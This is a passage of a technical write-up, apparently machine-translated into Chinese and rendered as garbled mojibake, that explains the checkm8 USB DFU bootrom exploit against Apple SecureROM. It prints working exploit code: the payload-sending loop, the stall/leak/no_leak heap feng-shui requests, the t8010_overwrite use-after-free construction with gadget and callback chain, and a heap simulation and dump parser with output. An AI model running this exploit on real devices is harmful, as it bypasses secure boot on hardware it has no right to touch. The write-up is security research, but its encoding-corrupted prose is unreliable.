dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50) for i in range(0, len(payload), 0x800): libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50) dfu.usb_reset(device) dfu.release_device(device) device = dfu.acquire_device() if 'PWND:[checkm8]' not in device.serial_number: print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.' sys.exit(1) print 'Device is now in pwned DFU Mode.' print '(%0.2f seconds)' % (time.time() - start) dfu.release_device(device) if __name__ == '__main__': main()</span></span></code> </pre> <br><p>  <code>checkm8</code>çš„æ“ä½œåˆ†ä¸º<code>checkm8</code>å‡ ä¸ªé˜¶æ®µï¼š </p><br><ol><li> å †é£æ°´ </li><li> åœ¨ä¸æ¸…é™¤å…¨å±€çŠ¶æ€çš„æƒ…å†µä¸‹åˆ†é…å’Œé‡Šæ”¾<code>IO</code>ç¼“å†²åŒº </li><li>  <code>use-after-free</code>è¦†ç›–è¦†ç›–<code>usb_device_io_request</code> </li><li> æ”¾ç½®æœ‰æ•ˆè½½è· </li><li> æ‰§è¡Œ<code>callback-chain</code> </li><li>  <code>shellcode</code>æ‰§è¡Œ </li></ol><br><p> è®©æˆ‘ä»¬è¯¦ç»†äº†è§£æ‰€æœ‰é˜¶æ®µã€‚ </p><br><h2 id="1-heap-feng-shui">  1.å †é£æ°´ </h2><br><p> æˆ‘ä»¬è®¤ä¸ºè¿™æ˜¯æœ€æœ‰è¶£çš„é˜¶æ®µï¼Œå› æ­¤æˆ‘ä»¬å°†èŠ±è´¹æ›´å¤šçš„æ—¶é—´æ¥æè¿°å®ƒã€‚ </p><br><pre> <code class="python hljs">stall(device) leak(device) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">6</span></span>): no_leak(device) dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p> è¿™ä¸ªé˜¶æ®µå¯¹äºä»¥æœ‰åˆ©äºåˆ©ç”¨<code>use-after-free</code>çš„æ–¹å¼å®‰æ’å †æ˜¯å¿…è¦çš„ã€‚ é¦–å…ˆï¼Œè®©æˆ‘ä»¬è€ƒè™‘ä¸€ä¸‹è°ƒç”¨<code>stall</code> ï¼Œ <code>leak</code> ï¼Œ <code>no_leak</code> ï¼š </p><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">stall</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">0.00001</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">no_leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC1</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre> <br><p>  <code>libusb1_no_error_ctrl_transfer</code>æ˜¯<code>libusb1_no_error_ctrl_transfer</code>çš„åŒ…è£…ï¼Œå¿½ç•¥äº†åœ¨æ‰§è¡Œè¯·æ±‚æœŸé—´å‡ºç°çš„æ‰€æœ‰å¼‚å¸¸ã€‚  <code>libusb1_async_ctrl_transfer</code>æ˜¯<code>libusb</code>çš„<code>libusb_submit_transfer</code>å‡½æ•°çš„åŒ…è£…ç¨‹åºï¼Œç”¨äºå¼‚æ­¥æ‰§è¡Œéœ€æ±‚ã€‚ </p><br><p> ä»¥ä¸‹å‚æ•°ä¼ é€’ç»™è¿™äº›è°ƒç”¨ï¼š </p><br><ul><li> è®¾å¤‡ç¼–å· </li><li>  <code>SETUP</code>æ•°æ®åŒ…çš„æ•°æ®ï¼ˆæ‚¨å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">è¯´æ˜</a> ï¼‰ï¼š <br><ul><li> <code>bmRequestType</code> </li> <li> <code>bRequest</code> </li> <li> <code>wValue</code> </li> <li> <code>wIndex</code> </li> </ul></li><li> æ•°æ®é•¿åº¦ï¼ˆ <code>wLength</code> ï¼‰æˆ–æ•°æ®<code>Data Stage</code>çš„<code>Data Stage</code> </li><li> è¯·æ±‚è¶…æ—¶ </li></ul><br><p> å‚æ•°<code>bmRequestType</code> ï¼Œ <code>bRequest</code> ï¼Œ <code>wValue</code>å’Œ<code>wIndex</code>ç”±æ‰€æœ‰ä¸‰ç§è¯·æ±‚ç±»å‹å…±äº«ï¼š </p><br><ul><li> <code>bmRequestType = 0x80</code> <br> <ul><li>  <code>0b1XXXXXXX</code> <code>Data Stage</code>æ–¹å‘ï¼ˆè®¾å¤‡åˆ°ä¸»æœºï¼‰ </li><li>  <code>0bX00XXXXX</code>æ ‡å‡†è¯·æ±‚ç±»å‹ </li><li>  <code>0bXXX00000</code>è®¾å¤‡æ˜¯è¯·æ±‚çš„æ¥æ”¶è€… </li></ul></li><li>  <code>bRequest = 6</code>è¯·æ±‚è·å–æè¿°ç¬¦ï¼ˆ <code>GET_DESCRIPTOR</code> ï¼‰ </li><li> <code>wValue = 0x304</code> <br> <ul><li>  <code>wValueHigh = 0x3</code>å®šä¹‰æè¿°ç¬¦çš„ç±»å‹-å­—ç¬¦ä¸²ï¼ˆ <code>USB_DT_STRING</code> ï¼‰ </li><li>  <code>wValueLow = 0x4</code>å­—ç¬¦ä¸²æè¿°ç¬¦çš„ç´¢å¼•4ï¼Œå¯¹åº”äºè®¾å¤‡åºåˆ—å·ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå­—ç¬¦ä¸²ä¸º<code>CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:001A40362045E526 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]</code> ï¼‰ </li></ul></li><li>  <code>wIndex = 0x40A</code>å­—ç¬¦ä¸²è¯­è¨€çš„<code>wIndex = 0x40A</code>ç¬¦ï¼Œå…¶å€¼ä¸åˆ©ç”¨æ— å…³ï¼Œå¯ä»¥æ›´æ”¹ã€‚ </li></ul><br><p> å¯¹äºè¿™äº›è¯·æ±‚ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œåœ¨å †ä¸­éƒ½ä¼šä¸ºä»¥ä¸‹ç»“æ„çš„å¯¹è±¡åˆ†é…0x30å­—èŠ‚ï¼š </p><br><p><img src="https://habrastorage.org/webt/-e/ub/wb/-eubwbh-2fhsjb9bs36t0qom7be.png"></p><br><p> è¯¥å¯¹è±¡æœ€æœ‰è¶£çš„å­—æ®µæ˜¯<code>callback</code>å’Œ<code>next</code> ã€‚ </p><br><ul><li>  <code>callback</code>æ˜¯æŒ‡å‘è¯·æ±‚å®Œæˆåå°†è¢«è°ƒç”¨çš„å‡½æ•°çš„æŒ‡é’ˆã€‚ </li><li>  <code>next</code>æ˜¯æŒ‡å‘ç›¸åŒç±»å‹çš„ä¸‹ä¸€ä¸ªå¯¹è±¡çš„æŒ‡é’ˆï¼› ç»„ç»‡è¯·æ±‚é˜Ÿåˆ—æ˜¯å¿…è¦çš„ã€‚ </li></ul><br><p>  <code>stall</code>çš„å…³é”®ç‰¹å¾æ˜¯å®ƒä»¥æœ€å°è¶…æ—¶ä½¿ç”¨å¼‚æ­¥æ‰§è¡Œè¯·æ±‚ã€‚ è¿™å°±æ˜¯ä¸ºä»€ä¹ˆï¼Œå¦‚æœå¹¸è¿çš„è¯ï¼Œè¯¥è¯·æ±‚å°†åœ¨æ“ä½œç³»ç»Ÿçº§åˆ«è¢«å–æ¶ˆå¹¶ä¿ç•™åœ¨æ‰§è¡Œé˜Ÿåˆ—ä¸­ï¼Œå¹¶ä¸”äº‹åŠ¡å°†æ— æ³•å®Œæˆã€‚ å¦å¤–ï¼Œè®¾å¤‡å°†ç»§ç»­æ¥æ”¶æ‰€æœ‰å³å°†åˆ°æ¥çš„<code>SETUP</code>æ•°æ®åŒ…ï¼Œå¹¶åœ¨å¿…è¦æ—¶å°†å®ƒä»¬æ”¾åœ¨æ‰§è¡Œé˜Ÿåˆ—ä¸­ã€‚ åæ¥ï¼Œåœ¨<code>Arduino</code>ä¸Šå¯¹<code>USB</code>æ§åˆ¶å™¨è¿›è¡Œäº†è¯•éªŒï¼Œæˆ‘ä»¬å‘ç°ä¸ºäº†æˆåŠŸåˆ©ç”¨æ¼æ´ï¼Œæˆ‘ä»¬éœ€è¦ä¸»æœºå‘é€<code>SETUP</code>æ•°æ®åŒ…å’Œ<code>IN</code>ä»¤ç‰Œï¼Œæ­¤åç”±äºè¶…æ—¶è€Œå¿…é¡»å–æ¶ˆäº‹åŠ¡ã€‚ æ­¤ä¸å®Œæ•´çš„äº¤æ˜“å¦‚ä¸‹æ‰€ç¤ºï¼š </p><br><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/sh/zq/ia/shzqiacghex3lk7jc9nhgoz3m7g.png"></div><br><p> é™¤æ­¤ä¹‹å¤–ï¼Œè¯·æ±‚çš„é•¿åº¦ä»…ç›¸å·®ä¸€ä¸ªå•ä½ã€‚ å¯¹äºæ ‡å‡†è¯·æ±‚ï¼Œæœ‰ä¸€ä¸ªå¦‚ä¸‹æ‰€ç¤ºçš„æ ‡å‡†<code>callback</code> ï¼š </p><br><p><img src="https://habrastorage.org/webt/cx/as/gn/cxasgnrqyant31ostgflo85zxro.png"></p><br><p>  <code>io_length</code>çš„å€¼ç­‰äºè¯·æ±‚çš„<code>SETUP</code>æ•°æ®åŒ…ä¸­<code>wLength</code>çš„æœ€å°å€¼å’Œè¯·æ±‚æè¿°ç¬¦çš„åŸå§‹é•¿åº¦ã€‚ ç”±äºæè¿°ç¬¦å¾ˆé•¿ï¼Œæˆ‘ä»¬å¯ä»¥å°†<code>io_length</code>çš„å€¼æ§åˆ¶åœ¨å…¶é•¿åº¦å†…ã€‚  <code>g_setup_request.wLength</code>çš„å€¼ç­‰äºæœ€åä¸€ä¸ª<code>SETUP</code>æ•°æ®åŒ…ä¸­çš„<code>wLength</code>çš„å€¼ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒæ˜¯<code>0xC1</code> ã€‚ </p><br><p> è¿™æ ·ï¼Œç”±è°ƒç”¨<code>stall</code>å’Œ<code>leak</code>å½¢æˆçš„è¯·æ±‚å°±å®Œæˆäº†ï¼Œæ»¡è¶³äº†ç»ˆç«¯<code>callback</code>å‡½æ•°ä¸­çš„æ¡ä»¶ï¼Œå¹¶<code>usb_core_send_zlp()</code> ã€‚ æ­¤è°ƒç”¨å°†åˆ›å»ºä¸€ä¸ªç©ºæ•°æ®åŒ…ï¼ˆ <code>zero-length-packet</code> ï¼‰ï¼Œå¹¶å°†å…¶æ·»åŠ åˆ°æ‰§è¡Œé˜Ÿåˆ—ä¸­ã€‚ è¿™å¯¹äºåœ¨<code>Status Stage</code>æ­£ç¡®å®Œæˆäº‹åŠ¡æ˜¯å¿…è¦çš„ã€‚ </p><br><p> é€šè¿‡è°ƒç”¨å‡½æ•°<code>usb_core_complete_endpoint_io</code>å®Œæˆè¯·æ±‚ã€‚ é¦–å…ˆï¼Œå®ƒè°ƒç”¨<code>callback</code> ï¼Œç„¶åé‡Šæ”¾è¯·æ±‚çš„å†…å­˜ã€‚ è¯¥è¯·æ±‚ä¸ä»…åœ¨æ•´ä¸ªäº‹åŠ¡å®Œæˆæ—¶å®Œæˆï¼Œè€Œä¸”åœ¨é‡ç½®<code>USB</code>æ—¶ä¹Ÿå®Œæˆã€‚ æ”¶åˆ°ç”¨äºé‡ç½®<code>USB</code>çš„ä¿¡å·æ—¶ï¼Œæ‰§è¡Œé˜Ÿåˆ—ä¸­çš„æ‰€æœ‰è¯·æ±‚å°†å®Œæˆã€‚ </p><br><p> é€šè¿‡åœ¨æ‰§è¡Œé˜Ÿåˆ—ä¸­æœ‰é€‰æ‹©åœ°è°ƒç”¨<code>usb_core_send_zlp()</code>å¹¶éšåé‡Šæ”¾è¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—å¯¹å †çš„å……åˆ†æ§åˆ¶ï¼Œä»¥åˆ©ç”¨<code>use-after-free</code> ã€‚ é¦–å…ˆï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹è¯·æ±‚æ¸…ç†å¾ªç¯ï¼š </p><br><p><img src="https://habrastorage.org/webt/ik/tn/ym/iktnymzi4lywmtf1xsmcfsgpyb4.png"></p><br><p> å¦‚æ‚¨æ‰€è§ï¼Œé˜Ÿåˆ—è¢«æ¸…ç©ºï¼Œç„¶åè¢«å–æ¶ˆçš„è¯·æ±‚ç”±<code>usb_core_complete_endpoint_io</code>è¿è¡Œå’Œå®Œæˆã€‚  <code>usb_core_send_zlp</code>åˆ†é…çš„è¯·æ±‚æ”¾å…¥<code>ep-&gt;io_head</code> ã€‚  <code>USB</code>é‡ç½®å®Œæˆåï¼Œå°†æ¸…é™¤æœ‰å…³ç«¯ç‚¹çš„æ‰€æœ‰ä¿¡æ¯ï¼ŒåŒ…æ‹¬æŒ‡é’ˆ<code>io_head</code>å’Œ<code>io_tail</code> ï¼Œé›¶é•¿åº¦è¯·æ±‚å°†ä¿ç•™åœ¨å †ä¸­ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å †ä¸­åˆ›å»ºä¸€ä¸ªå°çš„å—ã€‚ ä»¥ä¸‹æ–¹æ¡ˆæ˜¾ç¤ºäº†å®ƒæ˜¯å¦‚ä½•å®Œæˆçš„ï¼š </p><br><p><img src="https://habrastorage.org/webt/jl/rj/v5/jlrjv55cw23fehubgo7hsqmv68w.png"></p><br><p> åœ¨<code>SecureROM</code>å †ä¸­ï¼Œä»æœ€å°çš„é€‚å½“ç©ºé—²å—ä¸­åˆ†é…äº†ä¸€ä¸ªæ–°çš„å†…å­˜åŒºåŸŸã€‚ é€šè¿‡ä½¿ç”¨ä¸Šè¿°æ–¹æ³•åˆ›å»ºä¸€ä¸ªå°çš„ç©ºé—²å—ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>USB</code>åˆå§‹åŒ–æœŸé—´çš„å†…å­˜åˆ†é…ï¼ŒåŒ…æ‹¬<code>io_buffer</code>å’Œè¯·æ±‚çš„åˆ†é…ã€‚ </p><br><p> ä¸ºäº†æ›´å¥½åœ°ç†è§£è¿™ä¸€ç‚¹ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹åˆå§‹åŒ–<code>DFU</code>æ—¶å‘å †å‘å‡ºäº†å“ªäº›è¯·æ±‚ã€‚ åœ¨åˆ†æ<code>iBoot</code>æºä»£ç å’Œå¯¹<code>SecureROM</code>åå‘å·¥ç¨‹æ—¶ï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä»¥ä¸‹é¡ºåºï¼š </p><br><ul><li><ol><li> åˆ†é…å„ç§å­—ç¬¦ä¸²æè¿°ç¬¦ <br><ul><li>  1.1ã€‚  <code>Nonce</code> ï¼ˆå¤§å°<code>234</code> ï¼‰ </li><li>  1.2ã€‚  <code>Manufacturer</code> ï¼ˆ <code>22</code> ï¼‰ </li><li>  1.3ã€‚  <code>Product</code> ï¼ˆ <code>62</code> ï¼‰ </li><li>  1.4ã€‚  <code>Serial Number</code> ï¼ˆ <code>198</code> ï¼‰ </li><li>  1.5ã€‚  <code>Configuration string</code> ï¼ˆ <code>62</code> ï¼‰ </li></ul></li></ol><br></li><li><ol><li> ä¸åˆ›å»º<code>USB</code>æ§åˆ¶å™¨ä»»åŠ¡ç›¸å…³çš„åˆ†é… <br><ul><li>  2.1ã€‚ ä»»åŠ¡ç»“æ„ï¼ˆ <code>0x3c0</code> ï¼‰ </li><li>  2.2ã€‚ ä»»åŠ¡å †æ ˆï¼ˆ <code>0x1000</code> ï¼‰ </li></ul></li></ol><br></li><li><ol><li>  <code>io_buffer</code> ï¼ˆ <code>0x800</code> ï¼‰ </li></ol><br></li><li><ol><li> é…ç½®æè¿°ç¬¦ <br><ul><li>  4.1ã€‚  <code>High-Speed</code> ï¼ˆ <code>25</code> ï¼‰ </li><li>  4.2ã€‚  <code>Full-Speed</code> ï¼ˆ <code>25</code> ï¼‰ </li></ul></li></ol><br></li></ul><br><p> ç„¶åï¼Œåˆ†é…è¯·æ±‚ç»“æ„ã€‚ å¦‚æœå †ä¸­æœ‰ä¸€å°å—ï¼Œåˆ™ç¬¬ä¸€ç±»çš„ä¸€äº›åˆ†é…å°†åˆ°è¾¾è¯¥å †ï¼Œæ‰€æœ‰å…¶ä»–åˆ†é…å°†ç§»åŠ¨ã€‚ å› æ­¤ï¼Œé€šè¿‡å¼•ç”¨æ—§ç¼“å†²åŒºï¼Œæˆ‘ä»¬å°†èƒ½å¤Ÿä½¿<code>usb_device_io_request</code>æº¢å‡ºã€‚ çœ‹èµ·æ¥åƒè¿™æ ·ï¼š </p><br><p><img src="https://habrastorage.org/webt/on/dl/dy/ondldygtgie2sho2l8xh8q5mlva.png"></p><br><p> ä¸ºäº†è®¡ç®—å¿…è¦çš„åç§»é‡ï¼Œæˆ‘ä»¬ä»…æ¨¡æ‹Ÿäº†ä¸Šé¢åˆ—å‡ºçš„æ‰€æœ‰åˆ†é…ï¼Œå¹¶å¯¹<code>iBoot</code>å †çš„æºä»£ç è¿›è¡Œäº†ä¸€äº›ä¿®æ”¹ã€‚ </p><br><div class="spoiler">  <b class="spoiler_title">åœ¨DFUä¸­æ¨¡æ‹Ÿå¯¹å †çš„è¯·æ±‚</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"heap.h"</span></span></span><span class="hljs-meta"> #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/mman.h&gt; #ifndef NOLEAK #define NOLEAK (8) #endif int main() { void * chunk = mmap((void *)0x1004000, 0x100000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); printf("chunk = %p\n", chunk); heap_add_chunk(chunk, 0x100000, 1); malloc(0x3c0); // alignment of the low order bytes of addresses in SecureRAM void * descs[10]; void * io_req[100]; descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); const int N = NOLEAK; void * task = malloc(0x3c0); void * task_stack = malloc(0x4000); void * io_buf_0 = memalign(0x800, 0x40); void * hs = malloc(25); void * fs = malloc(25); void * zlps[2]; for(int i = 0; i &lt; N; i++) { io_req[i] = malloc(0x30); } for(int i = 0; i &lt; N; i++) { if(i &lt; 2) { zlps[i] = malloc(0x30); } free(io_req[i]); } for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_0); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 2; i++) { printf("zlps[%d] = %p\n", i, zlps[i]); } printf("**********\n"); for(int i = 0; i &lt; 5; i++) { free(descs[i]); } free(task); free(task_stack); free(io_buf_0); free(hs); free(fs); descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); task = malloc(0x3c0); task_stack = malloc(0x4000); void * io_buf_1 = memalign(0x800, 0x40); hs = malloc(25); fs = malloc(25); for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_1); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 5; i++) { io_req[i] = malloc(0x30); printf("io_req[%d] = %p\n", i, io_req[i]); } printf("**********\n"); printf("io_req_off = %#lx\n", (int64_t)io_req[0] - (int64_t)io_buf_0); printf("hs_off = %#lx\n", (int64_t)hs - (int64_t)io_buf_0); printf("fs_off = %#lx\n", (int64_t)fs - (int64_t)io_buf_0); return 0; }</span></span></span></span></code> </pre> </div></div><br><p> è¯¥ç¨‹åºçš„è¾“å‡ºåœ¨<code>heap feng-shui</code>é˜¶æ®µæœ‰8ä¸ªè¯·æ±‚ï¼š </p><br><pre> <code class="plaintext hljs">chunk = 0x1004000 descs[0] = 0x1004480 descs[1] = 0x10045c0 descs[2] = 0x1004640 descs[3] = 0x10046c0 descs[4] = 0x1004800 task = 0x1004880 task_stack = 0x1004c80 io_buf = 0x1008d00 hs = 0x1009540 fs = 0x10095c0 zlps[0] = 0x1009a40 zlps[1] = 0x1009640 ********** descs[0] = 0x10096c0 descs[1] = 0x1009800 descs[2] = 0x1009880 descs[3] = 0x1009900 descs[4] = 0x1004480 task = 0x1004500 task_stack = 0x1004900 io_buf = 0x1008980 hs = 0x10091c0 fs = 0x1009240 io_req[0] = 0x10092c0 io_req[1] = 0x1009340 io_req[2] = 0x10093c0 io_req[3] = 0x1009440 io_req[4] = 0x10094c0 ********** io_req_off = 0x5c0 hs_off = 0x4c0 fs_off = 0x540</code> </pre> <br><p> å¦‚æ‚¨æ‰€è§ï¼Œå¦ä¸€ä¸ª<code>usb_device_io_request</code>å°†å‡ºç°åœ¨ä¸å‰ä¸€ä¸ªç¼“å†²åŒºçš„èµ·å§‹ä½ç½®<code>0x5c0</code>å¤„ï¼Œè¯¥ä½ç½®ä¸æ¼æ´åˆ©ç”¨ä»£ç ç›¸å¯¹åº”ï¼š </p><br><pre> <code class="python hljs">t8010_overwrite = <span class="hljs-string"><span class="hljs-string">'\0'</span></span> * <span class="hljs-number"><span class="hljs-number">0x5c0</span></span> t8010_overwrite += struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;32x2Q'</span></span>, t8010_nop_gadget, callback_chain)</code> </pre> <br><p> æ‚¨å¯ä»¥é€šè¿‡åˆ†æ<code>SecureRAM</code>è·å¾—çš„<code>SecureRAM</code>å †çš„å½“å‰çŠ¶æ€æ¥æ£€æŸ¥è¿™äº›ç»“è®ºçš„æœ‰æ•ˆæ€§ã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬ç¼–å†™äº†ä¸€ä¸ªç®€å•çš„è„šæœ¬æ¥è§£æå †çš„è½¬å‚¨å¹¶æšä¸¾å—ã€‚ è¯·è®°ä½ï¼Œåœ¨<code>usb_device_io_request</code>æº¢å‡ºæœŸé—´ï¼Œéƒ¨åˆ†å…ƒæ•°æ®å·²æŸåï¼Œå› æ­¤æˆ‘ä»¬åœ¨åˆ†ææœŸé—´å°†å…¶è·³è¿‡ã€‚ </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python3 import struct from hexdump import hexdump with open('HEAP', 'rb') as f: heap = f.read() cur = 0x4000 def parse_header(cur): _, _, _, _, this_size, t = struct.unpack('&lt;QQQQQQ', heap[cur:cur + 0x30]) is_free = t &amp; 1 prev_free = (t &gt;&gt; 1) &amp; 1 prev_size = t &gt;&gt; 2 this_size *= 0x40 prev_size *= 0x40 return this_size, is_free, prev_size, prev_free while True: try: this_size, is_free, prev_size, prev_free = parse_header(cur) except Exception as ex: break print('chunk at', hex(cur + 0x40)) if this_size == 0: if cur in (0x9180, 0x9200, 0x9280): # skipping damaged chunks this_size = 0x80 else: break print(hex(this_size), 'free' if is_free else 'non-free', hex(prev_size), prev_free) hexdump(heap[cur + 0x40:cur + min(this_size, 0x100)]) cur += this_size</span></span></code> </pre> <br><p> è„šæœ¬çš„è¾“å‡ºå’Œæ³¨é‡Šå¯ä»¥åœ¨ç ´åå™¨ä¸‹æ‰¾åˆ°ã€‚ æ‚¨å¯ä»¥çœ‹åˆ°ä½ä½å­—èŠ‚ä¸ä»¿çœŸç»“æœåŒ¹é…ã€‚ </p><br><div class="spoiler">  <b class="spoiler_title">åœ¨SecureRAMä¸­è§£æå †çš„ç»“æœ</b> <div class="spoiler_text"><pre> <code class="plaintext hljs">chunk at 0x4040 0x40 non-free 0x0 0 chunk at 0x4080 0x80 non-free 0x40 0 00000000: 00 41 1B 80 01 00 00 00 00 00 00 00 00 00 00 00 .A.............. 00000010: 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 ................ 00000020: FF 00 00 00 00 00 00 00 68 3F 08 80 01 00 00 00 ........h?...... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x4100 0x140 non-free 0x80 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4240 0x240 non-free 0x140 0 00000000: 68 6F 73 74 20 62 72 69 64 67 65 00 00 00 00 00 host bridge..... 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4480 // descs[4], conf string 0x80 non-free 0x240 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x4500 // task 0x400 non-free 0x80 0 00000000: 6B 73 61 74 00 00 00 00 E0 01 08 80 01 00 00 00 ksat............ 00000010: E8 83 08 80 01 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 